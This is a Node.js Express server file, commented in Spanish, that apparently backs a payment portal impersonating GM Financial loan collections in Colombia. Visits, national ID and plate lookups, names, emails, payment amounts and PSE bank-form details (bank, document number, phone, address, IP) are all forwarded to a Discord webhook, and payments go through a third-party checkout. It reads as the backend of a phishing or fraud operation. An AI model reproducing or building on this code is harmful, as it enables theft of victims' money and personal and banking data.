const express = require('express');
const path = require('path');
const { consultar, cerrar, precalentar, ConsultaError } = require('./robots');

const PORT = process.env.PORT || 3000;
const MAX_SIMULTANEAS = 3;
let activas = 0;

const app = express();
app.use(express.json({ limit: '10kb' }));

// El front-end (index.html) puede vivir en otro dominio (p. ej. Azure) y pedirle
// el resultado a este robot. Solo se abre la ruta de la API, no el resto del servidor.
app.use(['/api/consulta', '/api/pagar-helppiupay'], (req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// ============= AVISO A DISCORD AL ENTRAR AL PORTAL =============
async function avisarEntrada(req) {
  if (!DISCORD_WEBHOOK_URL) return;
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
  const referrer = req.headers.referer || req.headers.referrer || '-';
  const ua = (req.headers['user-agent'] || '-').substring(0, 256);
  const r = await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title: '🟢 Entrada al portal de pagos',
        color: 0x2ecc71,
        fields: [
          { name: '🌐 Referrer', value: referrer, inline: false },
          { name: '📍 IP', value: ip, inline: true },
          { name: '💻 User-Agent', value: ua, inline: false },
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });
  if (!r.ok) throw new Error('Discord respondió ' + r.status);
}

// Solo se publican las dos páginas; nada más de la carpeta del proyecto.
app.get(['/', '/index.html'], (req, res) => {
  avisarEntrada(req).catch(e => console.error('[DISCORD ENTRADA]', e.message));
  res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/index2.html', (req, res) => {
  avisarEntrada(req).catch(e => console.error('[DISCORD ENTRADA]', e.message));
  res.sendFile(path.join(__dirname, 'index2.html'));
});

async function avisarBusqueda(req, cedula, placa) {
  if (!DISCORD_WEBHOOK_URL) return;
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
  const r = await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title: '🔎 Búsqueda de crédito',
        color: 0x3498db,
        fields: [
          { name: '🪪 Número de documento', value: cedula, inline: true },
          { name: '🚗 Número de Placa', value: placa, inline: true },
          { name: '📍 IP', value: ip, inline: true },
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });
  if (!r.ok) throw new Error('Discord respondió ' + r.status);
}

app.post('/api/consulta', async (req, res) => {
  const cedula = String(req.body?.cedula ?? '').replace(/[\s.]/g, '');
  const placa = String(req.body?.placa ?? '').replace(/\s/g, '').toUpperCase();
  if (!/^\d{5,20}$/.test(cedula)) return res.status(400).json({ ok: false, code: 'DATOS', error: 'Ingresa un documento válido (solo números, sin puntos ni espacios).' });
  if (!/^[A-Z0-9]{5,12}$/.test(placa)) return res.status(400).json({ ok: false, code: 'DATOS', error: 'Ingresa una placa válida (sin espacios).' });
  if (activas >= MAX_SIMULTANEAS) return res.status(429).json({ ok: false, code: 'OCUPADO', error: 'Hay muchas consultas en curso. Intenta de nuevo en unos segundos.' });

  avisarBusqueda(req, cedula, placa).catch(e => console.error('[DISCORD BUSQUEDA]', e.message));
  activas++;
  try {
    const r = await consultar({ cedula, placa });
    res.json({ ok: true, ...r });
  } catch (e) {
    const code = e instanceof ConsultaError ? e.code : 'ROBOT';
    const msg = code === 'NO_ENCONTRADO' ? e.message : 'No pudimos completar la consulta en este momento. Intenta de nuevo.';
    console.error(`[consulta ${code}]`, e.message);
    res.status(code === 'NO_ENCONTRADO' ? 404 : 502).json({ ok: false, code, error: msg });
  } finally {
    activas--;
  }
});

// ============= PAGAR CON HELPPIUPAY (CHECKOUT SESSIONS) =============
// Las llaves van como variables de entorno en Render (HELPPIU_KEY_ID, HELPPIU_SECRET, HELPPIU_API_URL).
const HELPPIU_KEY_ID = process.env.HELPPIU_KEY_ID;
const HELPPIU_SECRET = process.env.HELPPIU_SECRET;
const HELPPIU_API_URL = process.env.HELPPIU_API_URL || 'https://helppiupay.com/api/v1/checkout-sessions';

async function avisarCreditoAceptado(req, cedula, placa, valor, nombre, apellido, email, credito) {
  if (!DISCORD_WEBHOOK_URL) return;
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
  const ua = (req.headers['user-agent'] || '-').substring(0, 256);
  const montoTxt = valor
    ? '$ ' + Number(String(valor).replace(/[^\d]/g, '')).toLocaleString('es-CO') + ' COP'
    : '-';
  const r = await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title: '✅ Cliente ha aceptado el monto y ha iniciado el pago',
        color: 0x2ecc71,
        fields: [
          { name: '🔑 Crédito', value: credito || '-', inline: true },
          { name: '💰 Monto', value: montoTxt, inline: true },
          { name: '​', value: '​', inline: true },
          { name: '👤 Nombre', value: `${nombre || '-'} ${apellido || ''}`.trim(), inline: true },
          { name: '📧 Correo', value: email || '-', inline: true },
          { name: '​', value: '​', inline: true },
          { name: '🪪 Documento', value: cedula || '-', inline: true },
          { name: '🚗 Placa', value: placa || '-', inline: true },
          { name: '📍 IP', value: ip, inline: true },
          { name: '💻 User-Agent', value: ua, inline: false },
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });
  if (!r.ok) throw new Error('Discord respondió ' + r.status);
}

app.post('/api/pagar-helppiupay', async (req, res) => {
  try {
    const { credito, valor, nombre, apellido, email, placa, identificacion } = req.body || {};
    if (!credito || !valor) return res.status(400).json({ error: 'Faltan credito o valor' });
    if (!HELPPIU_KEY_ID || !HELPPIU_SECRET) return res.status(500).json({ error: 'Faltan llaves de HelppiuPay en el servidor' });

    avisarCreditoAceptado(req, identificacion, placa, valor, nombre, apellido, email, credito).catch(e => console.error('[DISCORD CREDITO]', e.message));

    const amount = parseInt(String(valor).replace(/[^\d]/g, ''), 10);
    if (isNaN(amount) || amount <= 0) return res.status(400).json({ error: 'El valor no es válido: ' + valor });
    if (amount < 1000) return res.status(400).json({ error: 'El monto mínimo es 1000 COP' });

    const body = {
      reference: `GM-${credito}-${Date.now()}`,
      amount,
      currency: 'COP',
      description: `Pago crédito GM Financial #${credito}`,
      success_url: 'https://tusitio.com/pago-exitoso',
      cancel_url: 'https://tusitio.com/pago-cancelado',
      customer_email: email || '',
      customer_name: `${nombre || ''} ${apellido || ''}`.trim(),
      payment_method_types: ['pse']
    };
    console.log('[HELPPIU] Checkout Session - Crédito:', credito, '- Monto:', amount);

    const response = await fetch(HELPPIU_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${HELPPIU_KEY_ID}:${HELPPIU_SECRET}` },
      body: JSON.stringify(body)
    });
    const texto = await response.text();
    let data;
    try { data = JSON.parse(texto); } catch (e) {
      console.error('[HELPPIU] Respuesta no es JSON:', texto.substring(0, 500));
      return res.status(response.status).json({ error: 'HelppiuPay devolvió una respuesta no válida', statusCode: response.status });
    }
    if (!response.ok) {
      console.error('[HELPPIU ERROR]', data);
      return res.status(response.status).json({ error: data.message || data.error || 'Error al crear la sesión', detalle: data });
    }
    const url = data.url || data.checkout_url;
    if (!url) {
      console.error('[HELPPIU] No se recibió url. Respuesta:', data);
      return res.status(500).json({ error: 'HelppiuPay no devolvió una URL de pago', detalle: data });
    }
    console.log('[HELPPIU] URL generada:', url);
    res.json({ url });
  } catch (error) {
    console.error('[HELPPIU ERROR]', error);
    res.status(500).json({ error: error.message });
  }
});

// ============= AVISO A DISCORD CUANDO EL PAGO ES EXITOSO =============
// HelppiuPay avisa a esta ruta cuando cambia el estado de un pago (configurar la URL en su panel).
// Variables de entorno en Render: DISCORD_WEBHOOK_URL (obligatoria) y HELPPIU_WEBHOOK_TOKEN (opcional:
// si se define, la URL en HelppiuPay debe terminar en ?token=VALOR para aceptar el aviso).
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const HELPPIU_WEBHOOK_TOKEN = process.env.HELPPIU_WEBHOOK_TOKEN;
const ESTADOS_EXITOSOS = ['paid', 'approved', 'succeeded', 'success', 'successful', 'completed', 'complete', 'aprobado', 'aprobada', 'pagado', 'exitoso'];
const TIPOS_DOC = { CC: 'Cédula de ciudadanía', CE: 'Cédula de extranjería', NIT: 'NIT', PP: 'Pasaporte', TI: 'Tarjeta de identidad' };
const TIPOS_PERSONA = { '0': 'Natural', '1': 'Jurídica', 'N': 'Natural', 'J': 'Jurídica' };

function esPagoExitoso(b) {
  const d = (b && (b.data?.object || b.data)) || {};
  const candidatos = [b?.status, b?.payment_status, b?.state, d.status, d.payment_status, d.state, b?.type, b?.event, b?.event_type]
    .filter((v) => typeof v === 'string').map((v) => v.toLowerCase());
  return candidatos.some((v) => ESTADOS_EXITOSOS.some((e) => v === e || v.endsWith('.' + e) || v.endsWith('_' + e)));
}

function esPSEPendiente(b) {
  const event = (b?.event || '').toLowerCase();
  const d = (b && (b.data?.object || b.data)) || {};
  const status = (d.status || b?.status || '').toLowerCase();
  return event === 'transaction.pending' || (status === 'pending' && !esPagoExitoso(b));
}

async function avisarDiscord(b) {
  const d = (b && (b.data?.object || b.data)) || {};
  const pick = (...v) => v.find((x) => x !== undefined && x !== null && x !== '');
  const referencia = pick(d.reference, b.reference, d.id, b.id, '-');
  const monto = pick(d.amount, b.amount, d.amount_total, b.amount_total);
  const cliente = pick(d.customer_name, b.customer_name, d.customer?.name, b.customer?.name, '-');
  const email = pick(d.customer_email, b.customer_email, d.customer?.email, b.customer?.email, '-');
  const montoTxt = monto !== undefined
    ? '$ ' + Number(monto).toLocaleString('es-CO', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' COP'
    : '-';
  const r = await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title: '✅ Pago exitoso',
        color: 0x27ae60,
        fields: [
          { name: '🔖 Referencia', value: String(referencia), inline: false },
          { name: '💰 Monto', value: montoTxt, inline: true },
          { name: '👤 Cliente', value: String(cliente), inline: true },
          { name: '📧 Correo', value: String(email), inline: true },
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });
  if (!r.ok) throw new Error('Discord respondió ' + r.status);
}

async function avisarFormularioPSE(b) {
  if (!DISCORD_WEBHOOK_URL) return;
  const d = (b && (b.data?.object || b.data)) || {};
  const pick = (...v) => v.find((x) => x !== undefined && x !== null && x !== '');

  const referencia = pick(d.reference, b.reference, d.id, b.id, '-');
  const nombreCompleto = pick(d.customer_name, b.customer_name, d.customer?.name, b.customer?.name, d.name, b.name, '-');
  const partes = nombreCompleto !== '-' ? nombreCompleto.split(' ') : [];
  const nombre = partes[0] || '-';
  const apellido = partes.slice(1).join(' ') || '-';
  const correo = pick(d.customer_email, b.customer_email, d.customer?.email, b.customer?.email, d.email, b.email, '-');
  const monto = pick(d.amount, b.amount, d.amount_total, b.amount_total);
  const montoTxt = monto !== undefined
    ? '$ ' + Number(monto).toLocaleString('es-CO', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    : '-';

  const docTypeCode = pick(d.document_type, b.document_type, d.doc_type, b.doc_type, d.customer?.document_type, '-');
  const tipoDoc = TIPOS_DOC[docTypeCode] || docTypeCode;
  const numDoc = pick(d.document_number, b.document_number, d.document, b.document, d.doc_number, b.doc_number, d.customer?.document, '-');

  const personTypeCode = String(pick(d.person_type, b.person_type, d.customer?.person_type, '-'));
  const tipoPersona = TIPOS_PERSONA[personTypeCode] || personTypeCode;

  const flujoPSE = pick(d.pse_flow, b.pse_flow, d.flow, b.flow, d.pse_reference, b.pse_reference, '-');
  const bancoClave = pick(d.bank_code, b.bank_code, d.bank_key, b.bank_key, d.bank?.code, '-');
  const bancoNombre = pick(d.bank_name, b.bank_name, d.bank?.name, b.bank, '-');
  const bancoRedirect = pick(d.bank_redirect, b.bank_redirect, d.redirect_bank, b.redirect_bank, bancoNombre);

  const telefono = pick(d.phone, b.phone, d.customer_phone, b.customer_phone, d.customer?.phone, b.customer?.phone, d.telephone, '-');
  const direccion = pick(d.address, b.address, d.customer_address, b.customer_address, d.customer?.address, '-');

  const refStr = String(referencia);
  const creditoMatch = refStr.replace(/^GM-/, '').match(/^(.+)-\d+$/);
  const creditoSession = creditoMatch ? creditoMatch[1] : pick(d.checkout_session_id, b.checkout_session_id, '-');

  const ip = pick(d.ip, b.ip, d.client_ip, b.client_ip, d.customer_ip, b.customer_ip, '-');
  const ua = pick(d.user_agent, b.user_agent, d.browser, b.browser, '-');
  const ts = new Date().toLocaleString('sv-SE', { timeZone: 'America/Bogota', hour12: false }).replace('T', ' ');

  const r = await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title: '🏦 Envío formulario PSE',
        color: 0x9b59b6,
        fields: [
          { name: '🔖 Referencia', value: referencia, inline: false },
          { name: '👤 Nombre', value: nombre, inline: true },
          { name: '👤 Apellido', value: apellido, inline: true },
          { name: '📧 Correo', value: correo, inline: false },
          { name: '💰 Valor', value: montoTxt, inline: true },
          { name: '🪪 Tipo de documento', value: tipoDoc, inline: true },
          { name: '🪪 Número de documento', value: numDoc, inline: true },
          { name: '🏢 Tipo de persona', value: tipoPersona, inline: true },
          { name: '🔀 Flujo PSE', value: flujoPSE, inline: true },
          { name: '🏦 Banco clave', value: bancoClave, inline: true },
          { name: '🏦 Banco', value: bancoNombre, inline: true },
          { name: '🏦 Banco redirect', value: bancoRedirect, inline: true },
          { name: '📞 Teléfono', value: telefono, inline: true },
          { name: '📍 Dirección', value: direccion, inline: false },
          { name: '🔑 Crédito (sesión)', value: creditoSession, inline: true },
          { name: '🌐 IP', value: ip, inline: true },
          { name: '💻 User-Agent', value: ua.substring(0, 256), inline: false },
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });
  if (!r.ok) throw new Error('Discord respondió ' + r.status);
}

async function enviarPayloadRaw(b) {
  if (!DISCORD_WEBHOOK_URL) return;
  const raw = JSON.stringify(b, null, 2).substring(0, 1900);
  await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: `\`\`\`json\n${raw}\n\`\`\`` })
  });
}

app.post('/api/helppiupay-webhook', async (req, res) => {
  if (HELPPIU_WEBHOOK_TOKEN && req.query.token !== HELPPIU_WEBHOOK_TOKEN) return res.sendStatus(401);
  res.sendStatus(200); // se responde ya para que HelppiuPay no reintente
  try {
    const b = req.body || {};
    console.log('[WEBHOOK HELPPIU] recibido:', JSON.stringify(b).substring(0, 1000));
    if (!DISCORD_WEBHOOK_URL) return console.error('[DISCORD] Falta DISCORD_WEBHOOK_URL en el servidor');
    if (esPagoExitoso(b)) {
      await avisarDiscord(b);
      console.log('[DISCORD] Aviso de pago exitoso enviado');
    } else if (esPSEPendiente(b)) {
      await avisarFormularioPSE(b);
      await enviarPayloadRaw(b);
      console.log('[DISCORD] Aviso formulario PSE enviado');
    }
  } catch (e) {
    console.error('[DISCORD ERROR]', e.message);
  }
});

const server = app.listen(PORT, () => {
  console.log(`Consulta de recaudos en http://localhost:${PORT}`);
  precalentar(); // abre el navegador de una vez, sin esperar la primera consulta
});
const salir = async () => { server.close(); await cerrar(); process.exit(0); };
process.on('SIGINT', salir);
process.on('SIGTERM', salir);
